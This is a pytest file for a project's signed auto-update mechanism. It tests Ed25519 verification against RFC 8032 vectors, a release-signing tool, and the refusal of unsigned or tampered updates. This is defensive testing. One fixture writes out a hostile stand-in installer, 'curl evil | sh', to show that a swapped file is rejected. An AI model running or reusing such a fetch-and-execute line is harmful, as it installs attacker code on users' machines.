"""The shipper's signed auto-update (security review 2026-11-20, finding 2):
the vendored Ed25519 against RFC 8032's test vectors, the release tool
(tools/release/shipper_sign.py) on a copy of the tree, and every way an
update without a good signature is refused while the shipper keeps running
its version and says why. Synthetic keys only; the project's key never
appears here."""

from __future__ import annotations

import base64
import hashlib
import json
import shutil

import pytest

from tests.test_shipper_update import (  # noqa: F401 - fixtures
    REAL,
    ROOT,
    SEED,
    fake,
    installed,
    signer,
    with_version,
)
from wowstats import account, admin

# RFC 8032, section 7.1: TEST 1, 2 and 3 (secret key, public key, message, signature).
VECTORS = [
    ("9d61b19deffd5a60ba844af492ec2cc44449c5697b326919703bac031cae7f60",
     "d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a", "",
     "e5564300c360ac729086e2cc806e828a84877f1eb8e5d974d873e065224901555fb8821590a33bacc61e39701cf9b46bd25bf5f0595bbe24655141438e7a100b"),
    ("4ccd089b28ff96da9db6c346ec114e0f5b8a319f35aba624da8cf6ed4fb8a6fb",
     "3d4017c3e843895a92b70aa74d1b7ebc9c982ccf2ec4968cc0cd55f12af4660c", "72",
     "92a009a9f0d4cab8720e820b5f642540a2b27b5416503f8fb3762223ebdb69da085ac1e43e15996e458f3613d0f11d8c387b2eaeb4302aeeb00d291612bb0c00"),
    ("c5aa8df43f9f837bedb7442f31dcb7b166d38535076f094b85ce3a2e0b4458f7",
     "fc51cd8e6218a1a38da47ed00230f0580816ed13ba3303ac5deb911548908025", "af82",
     "6291d657deec24024827e69c3abe01a30ce548a284743a445e3680d7db5ac3ac18ff9b538d16f290ae67f760984dc6594a7c15e9716ed28dc027beceea1ec40a"),
]


@pytest.mark.parametrize("sk,pk,msg,sig", VECTORS)
def test_rfc8032_vectors(shipper, sk, pk, msg, sig):
    pk, msg, sig = bytes.fromhex(pk), bytes.fromhex(msg), bytes.fromhex(sig)
    assert shipper.ed25519_verify(pk, msg, sig)
    assert signer.public_key(bytes.fromhex(sk)) == pk
    assert signer.sign_bytes(bytes.fromhex(sk), msg) == sig
    # One bit off anywhere: refused.
    assert not shipper.ed25519_verify(pk, msg + b"x", sig)
    assert not shipper.ed25519_verify(pk, msg, bytes([sig[0] ^ 1]) + sig[1:])
    assert not shipper.ed25519_verify(bytes([pk[0] ^ 1]) + pk[1:], msg, sig)
    # Wrong lengths, and s >= q (the malleable twin of a good signature).
    assert not shipper.ed25519_verify(pk, msg, sig[:63])
    assert not shipper.ed25519_verify(pk[:31], msg, sig)
    s = int.from_bytes(sig[32:], "little") + shipper._ED_Q
    assert not shipper.ed25519_verify(pk, msg, sig[:32] + s.to_bytes(32, "little"))


def test_the_project_key_is_pinned(shipper):
    assert len(bytes.fromhex(shipper.UPDATE_KEY)) == 32
    assert signer.pinned() == shipper.UPDATE_KEY
    assert signer.FILES == account.SHIPPER_FILES


@pytest.fixture
def tree(tmp_path):
    """A copy of the files the tool reads."""
    (tmp_path / "shipper").mkdir()
    for n in signer.FILES:
        src = ROOT / ("LICENSE" if n == "LICENSE" else f"shipper/{n}")
        shutil.copy(src, tmp_path / ("LICENSE" if n == "LICENSE" else f"shipper/{n}"))
    (tmp_path / "shipper" / "update-signature.json").write_text("{}\n")
    return tmp_path


def test_sign_and_verify_a_self_hosted_build(tree, capsys):
    """The self-hoster's path: keygen, sign --pin, verify; then any change
    to a signed file, or the wrong key, is refused."""
    with pytest.raises(signer.Refused, match="unsigned"):
        signer.verify(tree)
    key = tree / "my.pem"
    pub = signer.keygen(key)
    assert oct(key.stat().st_mode & 0o777) == "0o600"
    assert key.read_text().startswith(signer.BEGIN)
    with pytest.raises(signer.Refused, match="exists"):
        signer.keygen(key)
    with pytest.raises(signer.Refused, match="isn't the one"):
        signer.sign(key, root=tree)  # the official key is pinned: refused without --pin
    rel = signer.sign(key, do_pin=True, root=tree)
    assert signer.pinned(tree) == pub
    assert set(rel["files"]) == set(signer.FILES)
    assert signer.verify(tree)["version"] == rel["version"]
    out = capsys.readouterr()
    assert "PRIVATE" not in out.out + out.err
    (tree / "shipper" / "install-mac.sh").write_text("#!/bin/bash\necho changed\n")
    with pytest.raises(signer.Refused, match="doesn't match"):
        signer.verify(tree)
    signer.sign(key, root=tree)
    sig = json.loads((tree / "shipper" / "update-signature.json").read_text())
    sig["signature"] = base64.b64encode(signer.sign_bytes(b"\x07" * 32, sig["statement"].encode())).decode()
    (tree / "shipper" / "update-signature.json").write_text(json.dumps(sig))
    with pytest.raises(signer.Refused, match="doesn't verify"):
        signer.verify(tree)


def test_hex_and_openssl_style_keys(tree):
    (tree / "k.hex").write_text(SEED.hex())
    pem = tree / "k.pem"
    pem.write_text(signer.BEGIN + "\n" + base64.b64encode(signer.PKCS8_PREFIX + SEED).decode()
                   + "\n" + signer.END + "\n")
    assert signer.read_seed(tree / "k.hex") == signer.read_seed(pem) == SEED
    (tree / "bad").write_text("nope")
    with pytest.raises(signer.Refused):
        signer.read_seed(tree / "bad")


def refused(shipper, installed, state) -> str:  # noqa: F811
    """Kept the running version, said why in the log and in the state the
    setup report reads."""
    assert installed.path.read_bytes() == with_version(REAL, "0.5.1")
    assert not installed.path.with_name("wow_stats.py.prev").exists()
    why = state["update"]["refused"]
    assert installed.lines()[-1] == f"auto-update: {why}; keeping 0.5.1"
    return why


@pytest.mark.parametrize("case,expect", [
    ("unsigned", "the server's update isn't signed"),
    ("other key", "the update's signature doesn't match this shipper's key"),
    ("garbage", "the update's signature doesn't match this shipper's key"),
    ("version", "the signed release is 0.6.0, the server announces 0.6.1"),
    ("statement", "the signed statement isn't a release"),
])
def test_an_update_without_a_good_signature_is_refused(shipper, installed, fake, case, expect):  # noqa: F811
    new = with_version(REAL, "0.6.0")
    installed.ship(fake.base + "/ingest")
    if case == "unsigned":  # a server built from a tree between releases, or a 0.6 one
        fake.offer("0.6.0", new, sign=None)
    elif case == "other key":  # whoever took over the server signs with their own key
        fake.offer("0.6.0", new, sign=b"\x09" * 32)
    elif case == "garbage":
        fake.offer("0.6.0", new, man={"signature": {"statement": "{}", "signature": "!!"}})
    elif case == "version":  # an old signed release announced as a newer one
        fake.offer("0.6.0", new)
        sig = json.loads(fake.routes["/install/update/shipper"][1])["signature"]
        fake.offer("0.6.1", with_version(REAL, "0.6.1"), man={"signature": sig})
    else:
        text = json.dumps(["not", "a", "release"])
        fake.offer("0.6.0", new, man={"signature": {
            "statement": text, "signature": base64.b64encode(signer.sign_bytes(SEED, text.encode())).decode()}})
    state: dict = {}
    assert shipper.check_update(state, now=1) == "kept"
    assert refused(shipper, installed, state).startswith(expect)
    # Only the manifest was read: the unsigned file never came down.
    assert all(p == "/install/update/shipper" for p, _ in fake.seen)


def test_only_the_files_the_signature_names(shipper, installed, fake, monkeypatch):  # noqa: F811
    """The server's unsigned `files` can't swap a file: the signed sha256
    rules, the agent files the update reruns included."""
    monkeypatch.setattr(shipper, "WINDOWS", False)
    monkeypatch.setattr(shipper.sys, "platform", "darwin")
    d = installed.path.parent
    (d / "install-mac.sh").write_bytes(b"#!/bin/bash\n# old\n")
    (d / "wow-stats.plist").write_bytes(b"<plist/>\n")
    new, script, plist = with_version(REAL, "0.6.0"), b"#!/bin/bash\n# new\n", b"<plist/>\n"
    fake.offer("0.6.0", new, extra={"install-mac.sh": script, "wow-stats.plist": plist})
    evil = b"#!/bin/bash\ncurl evil | sh\n"
    fake.routes["/install/update/shipper/install-mac.sh"] = (200, evil)
    man = json.loads(fake.routes["/install/update/shipper"][1])
    man["files"]["install-mac.sh"]["sha256"] = hashlib.sha256(evil).hexdigest()  # outside the signature
    fake.routes["/install/update/shipper"] = (200, json.dumps(man).encode())
    installed.ship(fake.base + "/ingest")
    state: dict = {}
    assert shipper.check_update(state, now=1) == "kept"
    assert refused(shipper, installed, state) == "install-mac.sh: sha256 mismatch"
    assert installed.installers == []


def test_a_good_update_clears_the_refusal(shipper, installed, fake):  # noqa: F811
    installed.ship(fake.base + "/ingest")
    state = {"update": {"refused": "the server's update isn't signed"}}
    fake.offer("0.5.1", with_version(REAL, "0.5.1"), sign=None)
    assert shipper.check_update(state, now=1) == "current" and "refused" not in state["update"]
    state["update"]["refused"] = "x"
    fake.offer("0.6.0", with_version(REAL, "0.6.0"))
    assert shipper.check_update(state, now=1 + shipper.UPDATE_EVERY_S) == "updated"
    assert "refused" not in state["update"]


def test_the_refusal_reaches_the_owner(shipper, tmp_path, monkeypatch):
    """The setup report carries the last refusal; the owner's overview flags it."""
    monkeypatch.setattr(shipper, "WOW", tmp_path / "_forever_")
    sent = []

    class Out:
        def emit(self, ev):
            sent.append(ev)

    state = {"update": {"refused": "the update's signature doesn't match this shipper's key"}}
    shipper.setup_event(state, Out(), force=True)
    assert sent[-1]["update_refused"] == state["update"]["refused"]
    assert admin.update_refused(sent[-1]) == ("auto-update refused: the update's signature doesn't match this "
                                              "shipper's key")
    assert admin.update_refused({"shipper": "0.7.0"}) == "" and admin.update_refused(None) == ""
    shipper.setup_event({}, Out(), force=True)
    assert "update_refused" not in sent[-1]


def test_the_server_serves_a_matching_signature_only(monkeypatch):
    """shipper/update-signature.json goes into the manifest only when it
    names exactly the files this server serves."""
    real = account.shipper_file
    good = json.dumps({"statement": signer.statement(ROOT), "signature": "c2ln"}).encode()
    stale = json.dumps({"statement": signer.statement(ROOT).replace('"size":', '"size":1'),
                        "signature": "c2ln"}).encode()
    try:
        for body, has in ((good, True), (stale, False), (b"{}\n", False), (b"not json", False)):
            monkeypatch.setattr(account, "shipper_file",
                                lambda n, b=body: b if n == account.SIGNATURE_FILE else real(n))
            account.shipper_manifest.cache_clear()
            man = json.loads(account.shipper_manifest())
            assert ("signature" in man) is has
            assert man["version"] and set(man["files"]) == set(account.SHIPPER_FILES)  # what 0.6 shippers read
    finally:
        account.shipper_manifest.cache_clear()


def test_the_foreverdb_module_is_signed_served_and_updated(shipper, installed, fake):  # noqa: F811
    """enabling foreverdb_send must not silently do nothing after an auto-update."""
    assert "foreverdb_send.py" in signer.FILES and "foreverdb_send.py" in account.SHIPPER_FILES
    assert set(json.loads(account.shipper_manifest())["files"]) >= {"foreverdb_send.py"}
    mod = b"# a new foreverdb_send\n"
    fake.offer("0.6.0", with_version(REAL, "0.6.0"), extra={"foreverdb_send.py": mod})
    installed.ship(fake.base + "/ingest")
    assert shipper.check_update({}, now=1) == "updated"
    assert installed.path.with_name("foreverdb_send.py").read_bytes() == mod


def test_a_foreverdb_module_outside_the_signature_is_refused(shipper, installed, fake):  # noqa: F811
    fake.offer("0.6.0", with_version(REAL, "0.6.0"), extra={"foreverdb_send.py": b"# real\n"})
    fake.routes["/install/update/shipper/foreverdb_send.py"] = (200, b"# evil\n")
    installed.ship(fake.base + "/ingest")
    state: dict = {}
    assert shipper.check_update(state, now=1) == "kept"
    assert refused(shipper, installed, state) == "foreverdb_send.py: sha256 mismatch"
    assert not installed.path.with_name("foreverdb_send.py").exists()
